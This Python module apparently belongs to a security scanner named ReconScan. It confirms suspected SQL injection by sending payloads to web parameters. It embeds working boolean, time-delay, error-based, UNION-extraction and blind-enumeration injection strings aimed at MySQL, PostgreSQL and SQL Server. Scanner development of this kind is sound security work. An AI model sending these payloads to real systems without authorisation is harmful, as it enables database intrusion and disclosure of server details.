"""
ReconScan SQL Injection Vulnerability Validator

Advanced validation system for confirming SQL injection vulnerabilities
and reducing false positives through multi-stage verification.
"""

import asyncio
import aiohttp
import time
import hashlib
import statistics
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

from .response_analyzer import DetectionResult, DetectionTechnique, DatabaseType
from .sql_payload_crafting_engine import PayloadCraftingEngine, PayloadCraftingContext
from ..shared.injection_discovery import InjectionPoint

class ValidationTechnique(Enum):
    """Validation techniques for confirming vulnerabilities."""
    RESPONSE_COMPARISON = "response_comparison"
    TIME_DELAY_CONFIRMATION = "time_delay_confirmation"
    ERROR_PATTERN_VERIFICATION = "error_pattern_verification"
    BOOLEAN_LOGIC_VERIFICATION = "boolean_logic_verification"
    DATA_EXTRACTION_TEST = "data_extraction_test"
    BLIND_ENUMERATION = "blind_enumeration"

@dataclass
class ValidationTest:
    """Individual validation test configuration."""
    technique: ValidationTechnique
    payload: str
    expected_behavior: str
    success_criteria: str
    confidence_weight: float

@dataclass
class ValidationResult:
    """Result of vulnerability validation."""
    is_confirmed: bool
    confidence_score: float
    validation_tests_passed: int
    validation_tests_total: int
    evidence: List[str]
    false_positive_likelihood: float
    validation_details: Dict[str, Any]

class SQLInjectionVulnerabilityValidator:
    """Advanced validator for SQL injection vulnerabilities."""
    
    def __init__(self, session: aiohttp.ClientSession):
        """Initialize the vulnerability validator."""
        self.session = session
        self.payload_engine = PayloadCraftingEngine()
        
        # Validation configuration
        self.validation_timeout = 15.0
        self.max_validation_requests = 10
        self.confidence_threshold = 0.7
        self.time_variance_threshold = 0.3  # 30% variance allowed
        
        # Validation payloads for different techniques
        self.validation_payloads = {
            ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION: [
                # True conditions
                " AND 1=1",
                " AND 'a'='a'",
                " AND 2>1",
                # False conditions  
                " AND 1=2",
                " AND 'a'='b'",
                " AND 2<1"
            ],
            ValidationTechnique.TIME_DELAY_CONFIRMATION: [
                # MySQL time delays
                " AND SLEEP(3)",
                " AND BENCHMARK(1000000,MD5(1))",
                # PostgreSQL time delays
                " AND pg_sleep(3)",
                # SQL Server time delays
                " AND WAITFOR DELAY '00:00:03'",
                # Universal time delays
                " AND (SELECT COUNT(*) FROM sysobjects WHERE id > (SELECT TOP 1 id FROM sysobjects ORDER BY NEWID()) AND SLEEP(3))"
            ],
            ValidationTechnique.ERROR_PATTERN_VERIFICATION: [
                # MySQL errors
                " AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))",
                " AND EXP(~(SELECT * FROM (SELECT (SELECT version()))a))",
                # PostgreSQL errors
                " AND CAST((SELECT version()) AS int)",
                # SQL Server errors
                " AND CONVERT(int, (SELECT @@version))",
                # Generic errors
                " AND 1/0",
                " AND CHAR(00)"
            ],
            ValidationTechnique.DATA_EXTRACTION_TEST: [
                # Database version extraction
                " UNION SELECT version(),NULL,NULL--",
                " UNION SELECT @@version,NULL,NULL--",
                " UNION SELECT sqlite_version(),NULL,NULL--",
                # User extraction
                " UNION SELECT user(),NULL,NULL--",
                " UNION SELECT current_user,NULL,NULL--",
                # Database name extraction
                " UNION SELECT database(),NULL,NULL--",
                " UNION SELECT db_name(),NULL,NULL--"
            ]
        }
        
        # Error patterns for validation
        self.validation_error_patterns = [
            r'mysql.*error',
            r'postgresql.*error',
            r'oracle.*error',
            r'sql server.*error',
            r'syntax error',
            r'division by zero',
            r'invalid.*query',
            r'unexpected.*token'
        ]
        
    async def validate_vulnerability(self, 
                                   injection_point: InjectionPoint,
                                   initial_detection: DetectionResult,
                                   context: PayloadCraftingContext) -> ValidationResult:
        """Validate a detected SQL injection vulnerability."""
        
        validation_tests = []
        evidence = []
        
        # Select appropriate validation techniques
        techniques = self._select_validation_techniques(initial_detection)
        
        # Perform validation tests
        for technique in techniques:
            test_results = await self._perform_validation_technique(
                injection_point, technique, context, initial_detection
            )
            validation_tests.extend(test_results)
        
        # Analyze validation results
        passed_tests = [test for test in validation_tests if test['passed']]
        total_tests = len(validation_tests)
        
        # Calculate confidence score
        confidence_score = self._calculate_validation_confidence(validation_tests)
        
        # Determine if vulnerability is confirmed
        is_confirmed = (
            confidence_score >= self.confidence_threshold and
            len(passed_tests) >= max(1, total_tests // 2)  # At least half must pass
        )
        
        # Calculate false positive likelihood
        false_positive_likelihood = self._calculate_false_positive_likelihood(
            validation_tests, initial_detection
        )
        
        # Compile evidence
        for test in passed_tests:
            evidence.append(test['evidence'])
        
        return ValidationResult(
            is_confirmed=is_confirmed,
            confidence_score=confidence_score,
            validation_tests_passed=len(passed_tests),
            validation_tests_total=total_tests,
            evidence=evidence,
            false_positive_likelihood=false_positive_likelihood,
            validation_details={
                'techniques_used': [t.value for t in techniques],
                'validation_tests': validation_tests,
                'initial_detection_confidence': initial_detection.confidence,
                'validation_improvement': confidence_score - initial_detection.confidence
            }
        )
    
    def _select_validation_techniques(self, detection: DetectionResult) -> List[ValidationTechnique]:
        """Select appropriate validation techniques based on initial detection."""
        techniques = []
        
        # Base validation: always do response comparison
        techniques.append(ValidationTechnique.RESPONSE_COMPARISON)
        
        # Technique-specific validation
        if detection.technique == DetectionTechnique.BOOLEAN_BLIND:
            techniques.append(ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION)
            
        elif detection.technique == DetectionTechnique.TIME_BASED:
            techniques.append(ValidationTechnique.TIME_DELAY_CONFIRMATION)
            
        elif detection.technique == DetectionTechnique.ERROR_BASED:
            techniques.append(ValidationTechnique.ERROR_PATTERN_VERIFICATION)
            
        elif detection.technique == DetectionTechnique.UNION_BASED:
            techniques.append(ValidationTechnique.DATA_EXTRACTION_TEST)
        
        # Additional validation for high-confidence detections
        if detection.confidence >= 0.7:
            if ValidationTechnique.BLIND_ENUMERATION not in techniques:
                techniques.append(ValidationTechnique.BLIND_ENUMERATION)
        
        return techniques
    
    async def _perform_validation_technique(self, 
                                          injection_point: InjectionPoint,
                                          technique: ValidationTechnique,
                                          context: PayloadCraftingContext,
                                          initial_detection: DetectionResult) -> List[Dict[str, Any]]:
        """Perform a specific validation technique."""
        
        if technique == ValidationTechnique.RESPONSE_COMPARISON:
            return await self._validate_response_comparison(injection_point, context)
            
        elif technique == ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION:
            return await self._validate_boolean_logic(injection_point, context)
            
        elif technique == ValidationTechnique.TIME_DELAY_CONFIRMATION:
            return await self._validate_time_delay(injection_point, context)
            
        elif technique == ValidationTechnique.ERROR_PATTERN_VERIFICATION:
            return await self._validate_error_patterns(injection_point, context)
            
        elif technique == ValidationTechnique.DATA_EXTRACTION_TEST:
            return await self._validate_data_extraction(injection_point, context)
            
        elif technique == ValidationTechnique.BLIND_ENUMERATION:
            return await self._validate_blind_enumeration(injection_point, context)
        
        return []
    
    async def _validate_response_comparison(self, 
                                          injection_point: InjectionPoint,
                                          context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate by comparing responses to different payloads."""
        tests = []
        
        try:
            # Get baseline response
            baseline_response = await self._send_request(injection_point, context.parameter_value)
            if not baseline_response:
                return tests
            
            # Test with benign modifications
            benign_payloads = [
                context.parameter_value + " ",  # Extra space
                context.parameter_value + "/**/",  # SQL comment
                context.parameter_value + "--"  # SQL comment
            ]
            
            consistent_responses = 0
            for payload in benign_payloads:
                response = await self._send_request(injection_point, payload)
                if response and self._responses_similar(baseline_response, response):
                    consistent_responses += 1
            
            # Test with malicious payloads
            malicious_payloads = ["'", '"', "1' OR '1'='1", "1\" OR \"1\"=\"1"]
            different_responses = 0
            
            for payload in malicious_payloads:
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                if response and not self._responses_similar(baseline_response, response):
                    different_responses += 1
            
            # Evaluate test
            passed = consistent_responses >= 2 and different_responses >= 1
            confidence = (consistent_responses * 0.3 + different_responses * 0.7) / 4
            
            tests.append({
                'technique': ValidationTechnique.RESPONSE_COMPARISON.value,
                'passed': passed,
                'confidence': confidence,
                'evidence': f"Consistent responses: {consistent_responses}/3, Different responses: {different_responses}/4"
            })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.RESPONSE_COMPARISON.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Validation error: {str(e)}"
            })
        
        return tests
    
    async def _validate_boolean_logic(self, 
                                    injection_point: InjectionPoint,
                                    context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate boolean-based SQL injection."""
        tests = []
        
        try:
            true_payloads = [p for p in self.validation_payloads[ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION][:3]]
            false_payloads = [p for p in self.validation_payloads[ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION][3:]]
            
            # Test true conditions
            true_responses = []
            for payload in true_payloads:
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                if response:
                    true_responses.append(response)
            
            # Test false conditions
            false_responses = []
            for payload in false_payloads:
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                if response:
                    false_responses.append(response)
            
            # Analyze response patterns
            if len(true_responses) >= 2 and len(false_responses) >= 2:
                # Check if true responses are similar to each other
                true_consistency = self._calculate_response_consistency(true_responses)
                false_consistency = self._calculate_response_consistency(false_responses)
                
                # Check if true and false responses are different
                cross_similarity = 0
                for true_resp in true_responses:
                    for false_resp in false_responses:
                        if not self._responses_similar(true_resp, false_resp):
                            cross_similarity += 1
                
                cross_difference = cross_similarity / (len(true_responses) * len(false_responses))
                
                passed = true_consistency >= 0.7 and false_consistency >= 0.7 and cross_difference >= 0.5
                confidence = (true_consistency + false_consistency + cross_difference) / 3
                
                tests.append({
                    'technique': ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION.value,
                    'passed': passed,
                    'confidence': confidence,
                    'evidence': f"True consistency: {true_consistency:.2f}, False consistency: {false_consistency:.2f}, Cross difference: {cross_difference:.2f}"
                })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Boolean validation error: {str(e)}"
            })
        
        return tests
    
    async def _validate_time_delay(self, 
                                 injection_point: InjectionPoint,
                                 context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate time-based SQL injection."""
        tests = []
        
        try:
            # Measure baseline response time
            baseline_times = []
            for _ in range(3):
                start_time = time.time()
                response = await self._send_request(injection_point, context.parameter_value)
                if response:
                    baseline_times.append(time.time() - start_time)
            
            if not baseline_times:
                return tests
            
            baseline_avg = statistics.mean(baseline_times)
            baseline_std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
            
            # Test time delay payloads
            delay_times = []
            successful_delays = 0
            
            for payload in self.validation_payloads[ValidationTechnique.TIME_DELAY_CONFIRMATION][:3]:
                test_payload = context.parameter_value + payload
                
                start_time = time.time()
                response = await self._send_request(injection_point, test_payload)
                response_time = time.time() - start_time
                
                if response:
                    delay_times.append(response_time)
                    
                    # Check if delay is significant
                    expected_delay = 3.0  # Expected delay from payloads
                    if response_time >= baseline_avg + expected_delay - 1.0:  # Allow 1 second tolerance
                        successful_delays += 1
            
            # Evaluate time-based validation
            if delay_times:
                avg_delay = statistics.mean(delay_times)
                delay_increase = avg_delay - baseline_avg
                
                passed = successful_delays >= 2 and delay_increase >= 2.0
                confidence = min(1.0, successful_delays / 3 * (delay_increase / 3.0))
                
                tests.append({
                    'technique': ValidationTechnique.TIME_DELAY_CONFIRMATION.value,
                    'passed': passed,
                    'confidence': confidence,
                    'evidence': f"Successful delays: {successful_delays}/3, Average delay increase: {delay_increase:.2f}s"
                })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.TIME_DELAY_CONFIRMATION.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Time delay validation error: {str(e)}"
            })
        
        return tests
    
    async def _validate_error_patterns(self, 
                                     injection_point: InjectionPoint,
                                     context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate error-based SQL injection."""
        tests = []
        
        try:
            error_responses = 0
            total_tests = 0
            error_types = set()
            
            for payload in self.validation_payloads[ValidationTechnique.ERROR_PATTERN_VERIFICATION]:
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                total_tests += 1
                
                if response:
                    content = response.get('content', '')
                    
                    # Check for error patterns
                    for pattern in self.validation_error_patterns:
                        import re
                        if re.search(pattern, content, re.IGNORECASE):
                            error_responses += 1
                            error_types.add(pattern)
                            break
            
            # Evaluate error validation
            passed = error_responses >= 2 and len(error_types) >= 1
            confidence = error_responses / total_tests if total_tests > 0 else 0
            
            tests.append({
                'technique': ValidationTechnique.ERROR_PATTERN_VERIFICATION.value,
                'passed': passed,
                'confidence': confidence,
                'evidence': f"Error responses: {error_responses}/{total_tests}, Error types: {len(error_types)}"
            })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.ERROR_PATTERN_VERIFICATION.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Error pattern validation error: {str(e)}"
            })
        
        return tests
    
    async def _validate_data_extraction(self, 
                                      injection_point: InjectionPoint,
                                      context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate UNION-based data extraction."""
        tests = []
        
        try:
            successful_extractions = 0
            total_attempts = 0
            
            for payload in self.validation_payloads[ValidationTechnique.DATA_EXTRACTION_TEST]:
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                total_attempts += 1
                
                if response:
                    content = response.get('content', '')
                    
                    # Check for data extraction indicators
                    extraction_indicators = [
                        r'\d+\.\d+\.\d+',  # Version numbers
                        r'mysql|postgresql|oracle|sql server',  # Database names
                        r'root|admin|sa|postgres',  # Common usernames
                        r'information_schema|mysql|postgres',  # System databases
                    ]
                    
                    import re
                    for indicator in extraction_indicators:
                        if re.search(indicator, content, re.IGNORECASE):
                            successful_extractions += 1
                            break
            
            # Evaluate data extraction validation
            passed = successful_extractions >= 1
            confidence = successful_extractions / total_attempts if total_attempts > 0 else 0
            
            tests.append({
                'technique': ValidationTechnique.DATA_EXTRACTION_TEST.value,
                'passed': passed,
                'confidence': confidence,
                'evidence': f"Successful extractions: {successful_extractions}/{total_attempts}"
            })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.DATA_EXTRACTION_TEST.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Data extraction validation error: {str(e)}"
            })
        
        return tests
    
    async def _validate_blind_enumeration(self, 
                                        injection_point: InjectionPoint,
                                        context: PayloadCraftingContext) -> List[Dict[str, Any]]:
        """Validate with blind enumeration techniques."""
        tests = []
        
        try:
            # Test database length enumeration
            length_tests = [
                " AND LENGTH(DATABASE())>0",
                " AND LENGTH(DATABASE())>5",
                " AND LENGTH(DATABASE())>20"
            ]
            
            enumeration_success = 0
            for i, payload in enumerate(length_tests):
                test_payload = context.parameter_value + payload
                response = await self._send_request(injection_point, test_payload)
                
                if response:
                    # For blind enumeration, we expect decreasing success rate
                    # as the conditions become more restrictive
                    enumeration_success += 1
            
            # Simple validation: at least first test should succeed
            passed = enumeration_success >= 1
            confidence = enumeration_success / len(length_tests)
            
            tests.append({
                'technique': ValidationTechnique.BLIND_ENUMERATION.value,
                'passed': passed,
                'confidence': confidence,
                'evidence': f"Enumeration responses: {enumeration_success}/{len(length_tests)}"
            })
            
        except Exception as e:
            tests.append({
                'technique': ValidationTechnique.BLIND_ENUMERATION.value,
                'passed': False,
                'confidence': 0.0,
                'evidence': f"Blind enumeration validation error: {str(e)}"
            })
        
        return tests
    
    async def _send_request(self, injection_point: InjectionPoint, payload: str) -> Optional[Dict[str, Any]]:
        """Send HTTP request with payload."""
        try:
            if injection_point.method.upper() == 'GET':
                url = f"{injection_point.url}?{injection_point.parameter}={payload}"
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=self.validation_timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers)
                    }
            
            elif injection_point.method.upper() == 'POST':
                data = {injection_point.parameter: payload}
                async with self.session.post(injection_point.url, data=data, 
                                           timeout=aiohttp.ClientTimeout(total=self.validation_timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers)
                    }
                    
        except Exception:
            return None
    
    def _responses_similar(self, response1: Dict, response2: Dict, threshold: float = 0.8) -> bool:
        """Check if two responses are similar."""
        content1 = response1.get('content', '')
        content2 = response2.get('content', '')
        
        # Simple similarity check based on length and hash
        if abs(len(content1) - len(content2)) > max(len(content1), len(content2)) * 0.2:
            return False
        
        # Hash comparison
        hash1 = hashlib.md5(content1.encode()).hexdigest()
        hash2 = hashlib.md5(content2.encode()).hexdigest()
        
        return hash1 == hash2
    
    def _calculate_response_consistency(self, responses: List[Dict]) -> float:
        """Calculate consistency among multiple responses."""
        if len(responses) < 2:
            return 1.0
        
        similar_pairs = 0
        total_pairs = 0
        
        for i in range(len(responses)):
            for j in range(i + 1, len(responses)):
                if self._responses_similar(responses[i], responses[j]):
                    similar_pairs += 1
                total_pairs += 1
        
        return similar_pairs / total_pairs if total_pairs > 0 else 0.0
    
    def _calculate_validation_confidence(self, validation_tests: List[Dict]) -> float:
        """Calculate overall validation confidence."""
        if not validation_tests:
            return 0.0
        
        passed_tests = [test for test in validation_tests if test['passed']]
        
        # Weighted average of confidence scores
        total_weight = 0
        weighted_confidence = 0
        
        for test in passed_tests:
            weight = 1.0  # Base weight
            
            # Increase weight for more reliable techniques
            if test['technique'] == ValidationTechnique.BOOLEAN_LOGIC_VERIFICATION.value:
                weight = 1.2
            elif test['technique'] == ValidationTechnique.DATA_EXTRACTION_TEST.value:
                weight = 1.3
            elif test['technique'] == ValidationTechnique.TIME_DELAY_CONFIRMATION.value:
                weight = 1.1
            
            weighted_confidence += test['confidence'] * weight
            total_weight += weight
        
        if total_weight == 0:
            return 0.0
        
        base_confidence = weighted_confidence / total_weight
        
        # Adjust based on number of passed tests
        test_ratio = len(passed_tests) / len(validation_tests)
        
        return min(1.0, base_confidence * (0.5 + 0.5 * test_ratio))
    
    def _calculate_false_positive_likelihood(self, 
                                           validation_tests: List[Dict],
                                           initial_detection: DetectionResult) -> float:
        """Calculate likelihood that this is a false positive."""
        
        # Start with base false positive rate
        fp_likelihood = 0.2  # 20% base rate
        
        # Reduce based on validation tests passed
        passed_tests = [test for test in validation_tests if test['passed']]
        if len(passed_tests) >= len(validation_tests) * 0.8:  # 80% passed
            fp_likelihood *= 0.3
        elif len(passed_tests) >= len(validation_tests) * 0.6:  # 60% passed
            fp_likelihood *= 0.5
        elif len(passed_tests) >= len(validation_tests) * 0.4:  # 40% passed
            fp_likelihood *= 0.7
        
        # Adjust based on initial detection confidence
        if initial_detection.confidence >= 0.8:
            fp_likelihood *= 0.4
        elif initial_detection.confidence >= 0.6:
            fp_likelihood *= 0.6
        
        # Adjust based on detection technique reliability
        technique_reliability = {
            DetectionTechnique.UNION_BASED: 0.95,
            DetectionTechnique.ERROR_BASED: 0.85,
            DetectionTechnique.BOOLEAN_BLIND: 0.75,
            DetectionTechnique.TIME_BASED: 0.65,
            DetectionTechnique.STACKED_QUERIES: 0.70
        }
        
        reliability = technique_reliability.get(initial_detection.technique, 0.5)
        fp_likelihood *= (1.0 - reliability)
        
        return min(1.0, max(0.0, fp_likelihood)) 